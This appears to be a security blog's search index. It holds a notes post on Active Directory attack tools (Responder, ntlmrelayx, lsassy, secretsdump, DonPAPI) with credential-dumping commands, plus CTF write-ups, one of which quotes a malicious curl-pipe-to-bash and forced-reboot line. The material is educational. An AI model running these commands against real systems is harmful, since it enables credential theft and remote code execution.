[ { "title": "Notes | AD | AD Tools", "url": "/Notes/AD/Tools", "categories": "Notes, AD", "tags": "AD, Nmap, Gobuster, Certipy, Ntlmralyx", "date": "2025-08-08 00:00:00 +0200", "snippet": "IntroductionThis post is about understanding how the main tools work, because it is great to achieve an attack but it’s better if you can do it from scratch. So if you know how tools work, then you know how attacks work.NmapDefinitionNmap is a powerful network scanning tool used to discover hosts, services, and vulnerabilities by performing port scanning, OS detection, and more.Default Use CaseTo check if a machine is UP or not, nmap pings the host and if it answers to the ping, then it marks it as UP. If there is no answer, nmap will try connecting to port 80 (http) and 443 (https) via a TCP connection.By default, nmap scans the 1000 TCP most used ports on the given target (ex: nmap $TARGET). If we read the documentation, we see that it divides ports into six states: open, closed, filtered, unfiltered, open|filtered, or closed|filtered. State Description open An application is actively accepting TCP connections, UDP datagrams or SCTP associations on this port. Finding these is often the primary goal of port scanning. Security-minded people know that each open port is an avenue for attack. Attackers and pen-testers want to exploit the open ports, while administrators try to close or protect them with firewalls without thwarting legitimate users. Open ports are also interesting for non-security scans because they show services available for use on the network. closed A closed port is accessible (it receives and responds to Nmap probe packets), but there is no application listening on it. They can be helpful in showing that a host is up on an IP address (host discovery, or ping scanning), and as part of OS detection. Because closed ports are reachable, it may be worth scanning later in case some open up. Administrators may want to consider blocking such ports with a firewall. Then they would appear in the filtered state, discussed next. filtered Nmap cannot determine whether the port is open because packet filtering prevents its probes from reaching the port. The filtering could be from a dedicated firewall device, router rules, or host-based firewall software. These ports frustrate attackers because they provide so little information. Sometimes they respond with ICMP error messages such as type 3 code 13 (destination unreachable: communication administratively prohibited), but filters that simply drop probes without responding are far more common. This forces Nmap to retry several times just in case the probe was dropped due to network congestion rather than filtering. This slows down the scan dramatically. unfiltered The unfiltered state means that a port is accessible, but Nmap is unable to determine whether it is open or closed. Only the ACK scan, which is used to map firewall rulesets, classifies ports into this state. Scanning unfiltered ports with other scan types such as Window scan, SYN scan, or FIN scan, may help resolve whether the port is open. open|filtered Nmap places ports in this state when it is unable to determine whether a port is open or filtered. This occurs for scan types in which open ports give no response. The lack of response could also mean that a packet filter dropped the probe or any response it elicited. So Nmap does not know for sure whether the port is open or being filtered. The UDP, IP protocol, FIN, NULL, and Xmas scans classify ports this way. closed|filtered This state is used when Nmap is unable to determine whether a port is closed or filtered. It is only used for the IP ID idle scan. By default Nmap will use the TCP SYN scan (-sS flag). It requires root privileges to run. It will send a SYN packet and wait for an answer from the target. If it receive a SYN/ACK, it means that the port is listening (open). If the response is RST (reset) then the port is marked as closed (non-listenener). If no response is received then the port is marked as filtered. The SYN scan won’t finish the 3-way-handshake. It will not send the ACK after receiving the SYN/ACK.More options-sU: This flag does an UDP scan instead of a TCP one. It will send specific payload to port having specific protocols (DNS, SNMP, ICMP) or empty packets for every other ports. This will allow to speed up a little UDP scans. UDP scans are slow because we can’t be sure that the machine received the packet we sent or not because they don’t make the 3-way-handshake as TCP does, some packets may get lost, because of timeouts or because of some protections like firewalls or IDS.Closed port often send an ICMP port unreachable error, but many hosts rate limit ICMP port unreachable messages by default. For example, the Linux 2.4.20 kernel limits destination unreachable messages to one per second (in net/ipv4/icmp.c). This will make a 65536 port scan last 18 hours. And as the man says Nmap detects rate limiting and slows down accordingly to avoid flooding the network with useless packets that the target machine will drop.. You can speed up your UDP by running it on multiple hosts at the same time, scanning from behind the firewall, and using --host-timeout to skip slow hosts.-sT: The TCP connect scan replace the default SYN when it is not applicable. It is less stealthy because it will do the full 3-way-handshake (SYN -&gt; SYN/ACK -&gt; ACK), close the connection (FIN -&gt; FIN/ACK -&gt; ACK) and may trigger alerts on the audited systems. The main advantage of this scan is that it doesn’t require root privilege. An other advantage is that it does the 3-way-handshake and close the connection, thus being less brutal than the SYN scan that will not close its connection.-Pn: Sometimes you get an error from nmap that tells you to run with this option because the machine appears to be down for nmap. This option is the No ping scan. This means that it will not ping the host to check if it is UP or not but instead, it will mark it as UP without verification.-sV: The Version detection is based on response received by nmap when it does its scan. It has more than 6500 pattern on over 650 protocols. Those information are stored in the nmap-service-rprobe database that contains probes for querying various services and match expressions to recognize and parse responses.-sC: You can run nmap with this flag to run the default set of script. This uses the Nmap Scripting Engine (NSE) and you can find information on the different categories of script here. Those scripts are wrote using the LUA programming language. Nmap is very flexible allowing you to write and use your own script with it. To provide your own script either run the --script $FILENAME or in /usr/share/nmap/scripts/. You can provide the * regex to select all scripts that start with a word (ex: ftp-*). You can also use default, intrusive or safe scans with mathematical and and or (ex: --script \"(default or safe or intrusive) and not http-*\")-O: The OS detection flag allows us to get more information about the OS of the target like the name (windows, linux, mac…), the version, the device type (router, switch…). It is based on a database (nmap-os-db) of known OS fingerprints. Nmap will connect to the host and check if there is a known fingerprint for it, if so the information will be printed out.Ffuf, gobuster…DefinitionAll the tools like Ffuf, gobuster, dirsearch… are used to brute-force directories, files, domains and parameters on web servers to discover hidden content or vulnerabilities.Here I am going to talk about the vhost, the subdomain and page scanning.Because web severs can host multiple websites, we can chose which website to show for which domain. This is virtual hosting. So the server is the one that will answer to your request. To specify which web site you want to reach, you specify it in the Host: XXX HTTP header.Because we want people to access our vhosts on our server, we create a DNS record of those so they have a corresponding IP linked to them.In summary: Feature Subdomains Virtual Hosts (vhosts) Definition Prefixes added to a domain in DNS (e.g., sub.domain.com) Server configuration that serves multiple sites on one server Purpose Organize sections of a domain or services. Also allows to create a DNS record for a specific IP address. Host multiple websites on the same server. DNS Relation Configured in DNS Configured on the web server (Apache, Nginx, etc.) Example blog.example.com, shop.example.com Web server hosting both example.com and another.com on the same IP If you like pretty outputs with emojis and stuff, check out feroxbuster or dirsearchTo be able to detect if a subdomain exists or not, tools like ffuf or gobuster will do a DNS query (usually an A record lookup) to check if the the subdomains resolves to an IP address or not. If and IP is found, then the tool can contact it and start scanning it.For vhost detection, we do a basic HTTP request specifying Host: XXX , where XXX is the vhost we want to test. Depending on the result we receive from the server, we will guess if the vhost exist or not. For example, with ffuf, we exclude the response length we receive from the first list of vhost and that we know are not real ones.In summary: Enumeration Type Protocol Used What is Sent What is Expected Subdomain Enumeration DNS (UDP/53) DNS queries IP address for valid subdomains (A or CNAME records) Vhost Enumeration HTTP/HTTPS (TCP/80 or 443) HTTP requests with different Host headers Valid virtual host content or errors For page or directory scanning, those tools only do an HTTP request (DNS resolution automatically done to get the IP of the domain) and based on the response (200, 301, 404…) they tell you if you have access, if it is forbidden for you, if the page does not exist… You can also filter by page size, number of words… A web server can chose not to respect the standard of the HTTP status code and return a status code 200 even if the webpage doesn’t exists. We can then filter by the size of the response from the server, number of words…In summary: Status Code Category Description 100 Informational Continue: The server has received the request headers, and the client should proceed to send the request body. 101 Informational Switching Protocols: The server is switching to a different protocol as requested by the client. 200 Success OK: The request was successful, and the server returned the requested data. 201 Success Created: The request was successful, and a new resource has been created. 202 Success Accepted: The request has been accepted for processing, but the processing is not complete. 204 Success No Content: The request was successful, but the server is not returning any content. 301 Redirection Moved Permanently: The requested resource has been moved to a new permanent URL. 302 Redirection Found (Temporary Redirect): The requested resource is temporarily at a different URL. 304 Redirection Not Modified: The cached version of the requested resource can be used. 400 Client Error Bad Request: The request was invalid or cannot be understood by the server. 401 Client Error Unauthorized: Authentication is required to access the resource. 403 Client Error Forbidden: The server understood the request, but it refuses to authorize it. 404 Client Error Not Found: The server could not find the requested resource. 405 Client Error Method Not Allowed: The HTTP method used is not allowed for the requested resource. 408 Client Error Request Timeout: The server timed out waiting for the client to send the request. 418 Client Error I’m a teapot. Used for requests they do not wish to handle 429 Client Error Too Many Requests: The client has sent too many requests in a given period. 500 Server Error Internal Server Error: The server encountered an error and could not complete the request. 502 Server Error Bad Gateway: The server was acting as a gateway or proxy and received an invalid response from the upstream server. 503 Server Error Service Unavailable: The server is temporarily unavailable, usually due to maintenance or overload. 504 Server Error Gateway Timeout: The server was acting as a gateway and did not receive a timely response from the upstream server. Default Use CaseFfufFor the vhost scan you can fuzz like this (where 4242 is the size of the response for a bad `vhost):ffuf -w /path/to/vhost/wordlist -u https://target -H \"Host: FUZZ.target\" -fs 4242For subdomains you can run the following command:ffuf -w /path/to/dns/wordlist -u https://FUZZ.targetAnd for page or directory listing you can just run the following:ffuf -w /path/to/dir/wordlist -u https://target/FUZZGobusterFor the vhost scan you can fuzz like this (where 4242 is the size of the response for a bad `vhost):gobuster vhost -w /path/to/vhost/wordlist -u https://targetFor subdomains you can run the following command:gobuster dns -w /path/to/dns/wordlist -d $DOMAIN You may want to add the -i option so that you have the IP address of the found domains printed out.And for page or directory listing you can just run the following:gobuster dir -w /path/to/dir/wordlist -u https://targetMore optionsFfuf-fc, -fl, -fs, -fw: You can filter responses by a lot of things like status code (-fc), the amount of line in the response (-fl), the response size (-fs), the amount of words (-fw) and much more…-recusion: This allows us to do recursive search on the found folders. If you know that there will be a lot of folders, you can add -recusion-depth X where X is the maximum depth where Fuff is going to check.-e $A,$B,$C: This allows you to provide one or multiple extensions ($A,$B,$C looks like .htlm,.php,.txt)-t 50: If you want to speed up your scanning, you can increase the number of threads. Don’t put a number of thread too big. It may cause the site to crash, ban you or give you a lot of errors.For more information about this tool, you can check codingo website.Gobuster-x $A,$B,$C: This allows you to provide one or multiple extensions ($A,$B,$C looks like htlm,php,txt) Pay attention to the fact that in ffuf extension we use the notation -e .EXTENSION but in gobuster we only provide the extension without the dot (-x EXTENSION).-t 50: If you want to speed up your scanning, you can increase the number of threads.ResponderDefinitionResponder focuses on capturing authentication credentials from protocols such as SMB, HTTP or LDAP by spoofing domain names or listening for incoming domain name resolution with protocols like LLMNR (Link-Local Multicast Name Resolution), NBT-NS (NetBIOS Name Service), and mDNS (Multicast DNS).Responder comes into two modes: Listening/passive mode (-A, --analyze flag):→ Responder waits for “someone” (a computer not a user) to do a name resolution and responds as the host to be resolved as Active mode:→ Responder sets up a SMB, HTTP or WPAD server to get authentication of the user→ Spoof protocols like LLMNR, NBT-NS, mDNS→ Then, the client sends authentication credentials such as NTLM challenge via protocols like SMB that we then can crack offline or use them for relay • LLMNR, NBT-NS, mDNS Poisoning: Spoof LLMNR, NBT-NS or mDNS protocols to asnwer to the victim and capture challenges (Net-NTLM hashes).• SMB and HTTP Server: Acts as a fake SMB or HTTP server to capture NTLM hashes.• WPAD Rogue Proxy Server: Captures web proxy auto-discovery protocol requests and redirects them to capture Net-NTLM hash.Default Use CaseThe default use case is responder -I $INTERFACE where $INTERFACE is the interface linked to your network.By default, Responder will start poisoning on the name resolution protocols LLMNR, NBT-NS, MDNS and DNS:And it opens several servers on your machine (SMB, HTTP, FTP…) for users to connect to:Once you launch it, wait for someone to connect to you and try to authenticate. You can capture NTLM hash and try to crack them with hashcat or relay them with ntlmrelayx:More optionsYou can append -wd to the initial command. the -w allows you to start the WPAD rogue proxy server and the -d allows you to answer for DHCP broadcast requests. Note that the -d option will inject a WPAD server in the DHCP responsentlmrelayxDefinitionNtlmrelayr is a tool that relays NTLM authentication requests to different services, allowing an attacker to gain unauthorized access through relay attacks. The targets we will be looking for are any server on a domain that doesn’t have the signing set to True (protocols not signed). To have better understanding on the NTLM authentication mechanism you can check here and for the relay attack, check thereDefault Use CaseNtlmrelayx will relay received connections to the correct server allowing us to get authenticated connections. You can run the following command :ntlmrelayx -tf targets.txt -of netntlm -smb2support -socks-tf $TARGETS contains the list of the servers you want to relay to.-of $FILENAME will save the response that is based on the client hash so you can try to crack them later-smb2support allows us to support SMB v2-socks starts a socks proxy to run commands via received authenticated connections. This will allow us to execute commands as a specific user without knowing his passwordWith those options enabled, we can see the incoming successful authentications : Those connections come from Reponder that send them to ntlmrelayx for relayBy running the command socks, we can see all spoofed users and if they are admin or not of the server:ntlmrelayx will create a session for each relayed connection (as we can see above). Other tools using proxies like proxychains should check on local port 1080 (by default on ntlmrelayx) if a session is available for the specific IP and port. If so, it will try to connect to it but it may need admin rights depending on the action we want to realize (AdminStatus set to TRUE).Because we use the option socks, we can now run commands with proxychains like a secretsdump with the admin user: You can use tools from impacket using the -no-pass option if you are using a relayed connection. If the option is not available, just specify an empty password and it should work the same. Only SMB and LDAP can be relayed. Here, we used ntlmrelayx with responder but you can use it with coercer to force the connection instead of waiting for it.Tools like nxc (previously cme) don’t have the -no-pass option. Just specify an empty password (or whatever you want, it will be ignored in any case) and it should be OK:More options-t $PROTOCOL://$SERVER if you want to relay to other protocols, you can specify it directly in the command line with this option. It is also possible to prepend it in the file when we use the -tf option. We will have lines like ldap://192.168.56.12 or smb://192.168.56.12. Note that when we used the tool to relay toSMB we could create socks to have a stable connection. This is not the case when we relay to LDAP. You will have to use the tools option to specify what to do like --add-computer $COMPUTER_NAME.-l $LOOT_DIR will dump the looted information in this $LOOT_DIR like SAM or LDAP information. By default, if a relayed connection allows an LDAP connection then ntlmrelayx will generate files based on the information found on the LDAP using ldapdomaindump (e.g. list of computer by OS, list of users with their description, list domain policies…)lsassyDefinitionLsassy is a post-exploitation tool designed to extract Windows credentials (LSASS dumps) remotely without touching disk, minimizing detection.LSASS is a process containing the last logged on users (local or domain). It checks user logging in, handles password change and create access token. The use of credential guard allows to isolate the process to protect it. For additional protection you can check this post of Microsoft.Lsassy will recover passwords remotely thanks to either ProcDump (Microsoft tool of the Sysinternals suite), or via the DLL of Windows comsvcs.dll that allows to dump process, but only if you are SYSTEM.This tool was developed by pixis so you can check his blog on hackndo if you want more information about the tool.Default Use CaseYou can run lsassy when you have an admin user on a server:lsassy -d $DOMAIN -u $USER -p $PASSWORD $SERVER_IPor using nxc / cme:nxc smb $SERVER_IP -d $DOMAIN -u $USER -p $PASSWORD -M lsassyMore options-m allows you to specify the dumping method like dumpertdll and many others. You’ll need to specify the path of the module (dll or binary) you are using with -O dumpertdll_path=$PATH_OF_THE_DLL to evade AV. You can find the code to compiler on the dumpert GitHub repository.SecretsdumpDefinitionSecretsdump is a tool to extract sensitive information like password hashes from remote systems without executing code on the target machine. You will need admin rights to be able to run this script successfully It dumps SAM and LSA (SECURITY) from Registery and save the result in temp directory. It also dumps NTDS (only on DC). It gets the list of domain users, their hashs and Kerberos keys via [MS-DRDS] DRSGetNCChanges() or via vssadmin After dumping everything, it cleans his traces by removing any created files.Default Use CaseYou can run Secretsdump with only a user and a password (or hash):secretsdump $DOMAIN$/$USER:$PASSWORD@$SERVER_IPMore options-hashes you may want to use this flag if you don’t have the password of the admin and use its hash instead.testssl.shDefinitiontestssl.sh is a tool that checks SSL/TLS configurations on servers to detect vulnerabilities or misconfigurations related to encryption and security protocols. First testssl.sh does a DNS lookup to find possibly multiple IP addresses. After that, it does a reverse DNS lookup to find the corresponding domain from the IPs. Then, it will check that the found targets have indeed SSL/TLS on port 443 unless another one is pecified It will check the SSL/TLS protocols. The service should not provide deprecated protocols like SSLv2, SSLv3, TLS 1 or TLS 1.1. Only TLS 2 or TLS 3 should be offered Then it will check if any outdated ciphers, such as RC4, DES or 3DES are used and show stronger ciphers like AES or AEAD cipher. It will also check the Perfect Forward Secrecy (PFS). If this is not supported, this mean that if an attacker can find the private key of the server, then it will be able to decode every communications. But if PFS is supported and the private key is found, this means that only the new messages can be read. Ciphers like DHE (Diffie-Hellman Ephemeral) or ECDHE (Elliptic Curve Diffie-Hellman Ephemeral) should be used. Checks if the server has a server-side cipher preferences enable. This allows to not allow communicate with deprecated cipher mechanism hence allowing only secure communications. The server default section provide a lot of information about the certificate(s) like the issuer, validity, expiration… It will also check that the server use secure session managment (session ID or session tickets). Then it will check the HTTP headers. This includes headers like Strict-Transport-Security (HSTS) X-Frame-Options and Content-Security-Policy (CSP), which help secure web applications against common attacks like XSS, clickjacking and man-in-the-middle attacks. Now it will check for SSL/TLS vulnerabilities like Heartbleed, POODLE, BEAST, DROWN, ROBOT, Logjam. After that, testssl.sh will check, based on a list of 370 pre-configured cipher, that the server supports strong and non-obsolete ones. The last step will do a client simulation that mimic how different clients (web browsers, mobile devices, different OS…) react with the server. This allows to check that the server is not vulnerable to downgrade attacks. Finally, testssl.sh will provide a grade to allow us to have a global idea of the certificate security level.CertificateTo have a better understanding of what does testssl.sh, I’ll just explain a bit what’s in a certificate also known as X.509 certificate. The first part of the certificate when we open it is about the subject information. Common name of the website that the certificate is intended to protect (exemple.com or *.exemple.com) Then we have information about the issuer (ex: Common name of the issuer) We then encounter information about the certificate’s serial number (unique positive integer to identify the certificate), the X.509 version (ex: 3), the signature algorithm (ex: SHA-256 with RSA) and the validity period. The public key is part of a key pair that also includes a private key. The public key allows the client (our browser) to encrypt the communication with the server. The private key is kept by the server to sign documents. or decrypt data. Signed documents with the private key can be verified by anyone who has the public key. The digital signature ensure authenticity (signature only generated by the Certificate Authority) and integrity (if the certificate is tempered, then the digital signature won’t match). The digital signature of an X.509 certificate is calculated by first creating a hash of the certificate’s data using a cryptographic hash function (like SHA-256). This hash is then encrypted with the private key of the certificate issuer (the Certificate Authority) to generate the signature, which can be verified by others using the issuer’s public key. We can have exensions that allows the owner of the certificate to have multiple domains bound to the same certificate. Your browser may calculate a fingerprint of the certificate to check its authenticity.The chain of trust as its name state is a trust between multiple certificates. A Root CA at the top, which issues certificates to Intermediate CAs, and these Intermediate CAs in turn issue certificates to end entities, forming a hierarchical structure that establishes trust through verification of each certificate’s authenticity and validity up to the Root CA. We may have the following diagram: The use of intermediate certificates allow better security. This allows root CA not to be exposed and so, to protect their private key by exposing intermediate CA. If an intermediate CA is compromised then it can just be revoked.Default Use CaseYou can use testssl.sh without specifying any flag and it will give you information about the certificate and possible vulnerabilities. You can use it like this:testssl.sh $TARGETMore options--file &lt;fname&gt; or the equivalent -iL &lt;fname&gt; are mass testing options. Allows to to test multiple domains.--basicauth &lt;user:pass&gt; This can be set to provide HTTP basic authentication credentials which are used during checks for security headers. BASICAUTH is the ENV variable you can use instead.--ip &lt;ip&gt; tests either the supplied IPv4 or IPv6 address instead of resolving host(s) in &lt;URI&gt;. IPv6 addresses need to be supplied in square brackets. --ip=one means: just test the first A record DNS returns (useful for multiple IPs). If -6 and --ip=one was supplied an AAAA record will be picked if available. The --ip option might be also useful if you want to resolve the supplied hostname to a different IP, similar as if you would edit /etc/hosts or /c/Windows/System32/drivers/etc/hosts. --ip=proxy tries a DNS resolution via proxy.--wide mode expands the cipher suite testing to include a larger and more exhaustive set of cipher suites.DonPAPIDefinitionDonPAPI is a post-exploitation tool used to extract credentials and sensitive data from Windows machines by targeting the Data Protection API (DPAPI). DPAPI allows the management of symmetric encryption of the secrets in a Windows environment. What we need to understand is that the process of storing secrets generate multiple files. It creates a blob in C:\\Users\\$USERNAME\\AppData\\Roaming\\Microsoft\\Credentials that contains raw bytes and the GUID of the master key file (located in C:\\Users\\$USERNAME\\AppData\\Roaming\\Microsoft\\Protect\\$USER_SID). With those two files and the password of $USERNAME we can recover any “protected” password that used DPAPI You can recover also DPAPI credentials from other users if you are a local or a domain administrator. You can provide the Net-NTLM hash instead of the password if you only have that. Here is a French explanation on how does DPAPI works and here is the English one ;)Default Use CaseBy default, donPAPIwill collect the following credentials: Chromium: Chromium browser Credentials, Cookies and Chrome Refresh Token Certificates: Windows Certificates CredMan: Credential Manager Firefox: Firefox browser Credentials and Cookies MobaXterm: Mobaxterm Credentials MRemoteNg: MRemoteNg Credentials RDCMan: RDC Manager Credentials Files: Files on Desktop and and Recent folder SCCM: SCCM Credentials Vaults: Vaults Credentials VNC: VNC Credentials Wifi: Wifi Credentials You can use it with only the username and his password:DonPAPI collect -d $DOMAIN -u $USER -p $PASSWORD -t $TARGET_IPMore optionsdonpapi gui: allows to see the found credentials in a web GUI. You can use the --basic-auth $USER:$PASSWORD with the gui option so that not everyone has access to it.-H LMHASH:NTHASH allows you to provide hashes instead of passwords" }, { "title": "CTFs | HeroCTF_2024 | Steganographie | Zipper", "url": "/CTFs/HeroCTF_2024/Steganographie/Zipper", "categories": "CTFs, HeroCTF_2024, Steganographie", "tags": "Stega, zip", "date": "2024-10-26 00:00:00 +0200", "snippet": "ZipperIn this challenge, we have access to this zip. First I tried to unzip it and we find a PDF with two images talking about the zip format. I tried to run binwalk on them with no luck. But after a wile, I tried to run it on the zip itself:As we can see, we have the zip containing the folder whatiszip, a bunch of other zip or zlib files but also a PNG image. We use binwalk to extract it but the classic -e won’t work. In this case, we use the --dd=.* option to recover every files.And the PNG image gives us the flag:" }, { "title": "CTFs | HeroCTF_2024 | Steganographie | Subliminal2", "url": "/CTFs/HeroCTF_2024/Steganographie/Subliminal2", "categories": "CTFs, HeroCTF_2024, Steganographie", "tags": "Stega", "date": "2024-10-26 00:00:00 +0200", "snippet": "Subliminal#2Here we are given a video with a square that appears on each frame. We need to recover every square, reassemble them into one image and save it to get the flag. I used the following code:import cv2import numpy as np# Path to the video filevideo_path = 'subliminal_hide.mp4'# Open the video capturecap = cv2.VideoCapture(video_path)# Check if video opened successfullyif not cap.isOpened(): print(\"Error: Could not open video.\") exit()# Get the width, height, and frame count of the videoframe_width = int(cap.get(cv2.CAP_PROP_FRAME_WIDTH))frame_height = int(cap.get(cv2.CAP_PROP_FRAME_HEIGHT))total_frames = int(cap.get(cv2.CAP_PROP_FRAME_COUNT))# Set the size of the squares to 20x20square_size = 20# Calculate the size of the output image to fit the squares in grid formoutput_width = (frame_width // square_size) * square_sizeoutput_height = (frame_height // square_size) * square_size# Initialize an empty array to store the reconstructed imageoutput_image = np.zeros((output_height, output_width, 3), dtype=np.uint8)# Starting position for placing each squarecurrent_x, current_y = 0, 0# Loop through each frame in the videoframe_number = 0while cap.isOpened(): ret, frame = cap.read() if not ret: break # End of video # Resize frame to ensure it fits the output grid exactly frame = cv2.resize(frame, (output_width, output_height)) # Extract a 20x20 square from the current position square = frame[current_y:current_y+square_size, current_x:current_x+square_size] # Place the extracted square in the output image at the current position output_image[current_y:current_y+square_size, current_x:current_x+square_size] = square # Update y-position to move down by square size current_y += square_size # If we reach the bottom of the column, move to the next column and reset y if current_y &gt;= output_height: current_y = 0 current_x += square_size # If we've filled all columns, stop the process if current_x &gt;= output_width: break frame_number += 1# Rotate the output image by 180° to the leftoutput_image = cv2.rotate(output_image, cv2.ROTATE_180)# Save the final reconstructed imageoutput_filename = \"reconstructed_image.png\"cv2.imwrite(output_filename, output_image)print(f\"Processing complete. The final reconstructed image is saved as {output_filename}.\")# Release the video capturecap.release() This also rotate the image because it is upside down when we save it at first.We get the following image:Because the last part is a bit dark, we have to guess the last part. We have Hero{The_demon..._eated!!!!} and we guess that the flag is Hero{The_demon_is_defeated!!!!}." }, { "title": "CTFs | HeroCTF_2024 | Reverse | AutoInfector", "url": "/CTFs/HeroCTF_2024/Reverse/AutoInfector", "categories": "CTFs, HeroCTF_2024, Reverse", "tags": "Reverse", "date": "2024-10-26 00:00:00 +0200", "snippet": "AutoInfectorWhen we get to this website we have a button to download a file. If we look at the JS that deals with the action of the button, we get the following code:Here is a clearer version of the code: We can use deobfusctor websites like JS Deobfuscator so that we get a better view of the code.The interesting part starts with the onclick section. Lets break this down line by line: First it will get an element from the web page (the title) Then it will hash it in md5 (hash1) After that, it will prompt an input box to allow you to provide the password If the provided string isn’t empty, it will hash it in md5 (hash2) Then it will xor the hash1 with hash2 If the result is equal to 11dfc83092be6f72c7e9e000e1de2960 (hash3) then it will prompt the flagSo basically we have: hash3 = hash1 XOR hash2We know hash3 and hash1. The only thing we don’t know is hash2 because it depends on what we input. So if we do a XOR operation between the two known hash, we should get the hash we don’t know (basic XOR rule). So we can do the following:Now that we have the hash we can crack it using hashcat: The full hashcat command is justhashcat -m 0 known_hash ~/rockyou.txtAnd now we can use this as the password to get the flag. And.. Voila:" }, { "title": "CTFs | HeroCTF_2024 | Misc | Moo", "url": "/CTFs/HeroCTF_2024/Misc/Moo", "categories": "CTFs, HeroCTF_2024, Misc", "tags": "Misc", "date": "2024-10-26 00:00:00 +0200", "snippet": "MooIn this challenge, we need to escape the restricted shell we are in.First we can try some commands to see what is working and what is not:So as we can see, a lot of commands are restricted. But the echo one is not.So now we know that our path is in the /usr/local/rbin folder. In this folder are the following files:First I started looking at the rbash file:I thought that it has something to do with the bash -r but in fact it was linked to the cowsay. If we check the GTFObins page of this binary we see that we can in fact run commands with it:Now that we know that and that we know we can run vim (present in our path), we can write a file that will execute a shell:Now we can save it and run it with cowsay:Now that we escaped, we can run any command in the terminal. Lets try the one they told us we can’t run. And… Voila:" }, { "title": "CTFs | HeroCTF_2024 | Misc | LazySysAdmin1", "url": "/CTFs/HeroCTF_2024/Misc/LazySysAdmin1", "categories": "CTFs, HeroCTF_2024, Misc", "tags": "Misc", "date": "2024-10-26 00:00:00 +0200", "snippet": "LazySysAdmin #1In this challenge we just have access to a web page and need to find the malicious code. When we access a post, we get a page with a bunch of text and if we look in the source code we can see a malicious JavaScript code :So we just have to base64 encode curl -s https://ghostbin.site/6y65l/raw | bash &amp;&amp; sleep 2 &amp;&amp; reboot -f. This gives us Y3VybCAtcyBodHRwczovL2dob3N0YmluLnNpdGUvNnk2NWwvcmF3IHwgYmFzaCAmJiBzbGVlcCAyICYmIHJlYm9vdCAtZgo=.So the flag is : HERO{Y3VybCAtcyBodHRwczovL2dob3N0YmluLnNpdGUvNnk2NWwvcmF3IHwgYmFzaCAmJiBzbGVlcCAyICYmIHJlYm9vdCAtZgo=}" }, { "title": "CTFs | HeroCTF_2024 | Misc | Einstein", "url": "/CTFs/HeroCTF_2024/Misc/Einstein", "categories": "CTFs, HeroCTF_2024, Misc", "tags": "Misc", "date": "2024-10-26 00:00:00 +0200", "snippet": "EinsteinSo in this challenge, we connect to an SSH server and we list the files:In the learn.c file we see the following code where the cat binary is called as is but not like /bin/cat:So we can create our own cat program and put its path at the beginning of the PATH variable: Note the use of -p in the bash command. This allows us to get the pid of the effective user (eistein) instead of the user running the program (user)Now we can run the learn binary and get the flag:" }, { "title": "CTFs | HeroCTF_2024 | Forensique | Transformers", "url": "/CTFs/HeroCTF_2024/Forensique/Transformers", "categories": "CTFs, HeroCTF_2024, Forensique", "tags": "Forensique, Forensic", "date": "2024-10-26 00:00:00 +0200", "snippet": "Transformers #1In this challenge, we are given an .iso file. We need to find the file extension of the malicious program and its sha256. To be able to read it easily, I’ve put this .iso in a windows VM. Now you just have to right click on it and mount it. Once this is done, you should see the following window that pops up:For me the malicious program was the .bat file present in the dev folder that will download the virus on the machine but for the organizers the malicious file was the Document link that executes the .bat file:To get the SHA-256 we can either mount the file on Linux or copy it to our host to get the sha256sum or we can use the Get-FileHash Powershell command:And so the flag is : HERO{lnk;c3bb38b34c7dfbb1e9e9d588d77f32505184c79cd3628a70ee6df6061e128f3e}Transformer #2For this chall, we need to get more information about the malicious file. We can drop the previously found SHA-256 on VirusTotal and get a bunch of information. If we go to the Community section, we get the name of the dropper:Now to know what is the domain requested, we have two option. Either we understand what the .bat files does or we use VirusTotal.Finding the domain by handIf we echo the command instead of executing it, we could understand what they are doing:Now, if we run this, we get the command executed printed out:Finally we can base64 decode the last string:And voilà… We have the domain meeronixt.com.Finding the domain with VirusTotalUsing VirusTotal, we can use a cool functionality available in the Relation section, the Graph Summary: Note that here we are working with the hash of the .bat file. Not the .lnk one.When we click on the graph, we are redirected to another interface and we can manipulate it easily :And here, we see clearly that it contacts a domain, and if we click on it:And so, the flag is:HERO{BUMBLEBEE;meeronixt.com}" }, { "title": "CTFs | HeroCTF_2024 | Forensique | Tenant trouble", "url": "/CTFs/HeroCTF_2024/Forensique/Tenant_trouble", "categories": "CTFs, HeroCTF_2024, Forensique", "tags": "Forensique, Forensic", "date": "2024-10-26 00:00:00 +0200", "snippet": "Tenant troubleIn this chall, we are given a .csv file that looks like this:We can use the following bash command to list the number of connection of each user:As we can see, the user mister.bennet@winchester77.onmicrosoft.com has much more connection than any other user. We can guess that this is the target of the attack. We can now grep this email in the.csv and see when we see a lot of UserLoginFailed:With all this information, we can now create the flag Hero{2024-05-02;mister.bennet@winchester77.onmicrosoft.com}" }, { "title": "CTFs | HeroCTF_2024 | Forensique | LazySysAdmin2", "url": "/CTFs/HeroCTF_2024/Forensique/LazySysAdmin2", "categories": "CTFs, HeroCTF_2024, Forensique", "tags": "Forensique", "date": "2024-10-26 00:00:00 +0200", "snippet": "LazySysAdmin #2In this challenge, we are given an .iso file. We can mount it on our machine and see the root folder of a Linux machine:First I tried to look inside the rr_moved folder but there was nothing in it. The next guess I had was to look inside the /tmp folder because it’s where we upload usually our stuff as attackers:We see two hidden files, .script.sh and .wrapper_script.sh:As we can see, the first script only run the second one and the second one recover strings from an URL. Lets curl the URL:As we can see, there is a bunch of base64, lets decode it:And… Voila. We get the flag HERO{AlwaYs-Ch3ck_What_u-C0Py-P4ste}" }, { "title": "CTFs | 404CTF_2024 | Web | Vous etes en RETARD", "url": "/CTFs/404_CTF_2024/Web/Vous_etes_en_RETARD", "categories": "CTFs, 404_CTF_2024, Web", "tags": "Web", "date": "2024-04-25 00:00:00 +0200", "snippet": "Vous êtes en RETARDIn this challenge we are just given an URL and we need to exploit this web site:Nothing interesting… Because we can’t fuzz with gobuster, let’s try looking in the source code for something interesting:As we can see, there is a page we didn’t know about /donnez-moi-mon-ticket-pitie. Lets go there:This new page just tells us that we still don’t have access to the stadium…We notice that is the window.validable includes our ticket ID, then we will get to the match, otherwise we won’t have any access. Lets just add our billet ID to the valiable:With this, we have access to the match and we get a congratulation message:This lets us think that we need to look in the cookies:" }, { "title": "CTFs | 404CTF_2024 | Web | Le match du siecle", "url": "/CTFs/404_CTF_2024/Web/Le_match_du_siecle", "categories": "CTFs, 404_CTF_2024, Web", "tags": "Web", "date": "2024-04-25 00:00:00 +0200", "snippet": "Le match du siecle [1/2]Here, we need to find a way to get a ticket for the match. We arrives on a basic page and we see that we can create an account so that’s what i did and I connect to it:As we can see, there is now a Solde that tells us we didn’t put any money on the website and a button to check our newly bought tickets. I checked the cookie to see if there was anything interesting…So… Obviously, I put 10000 in the 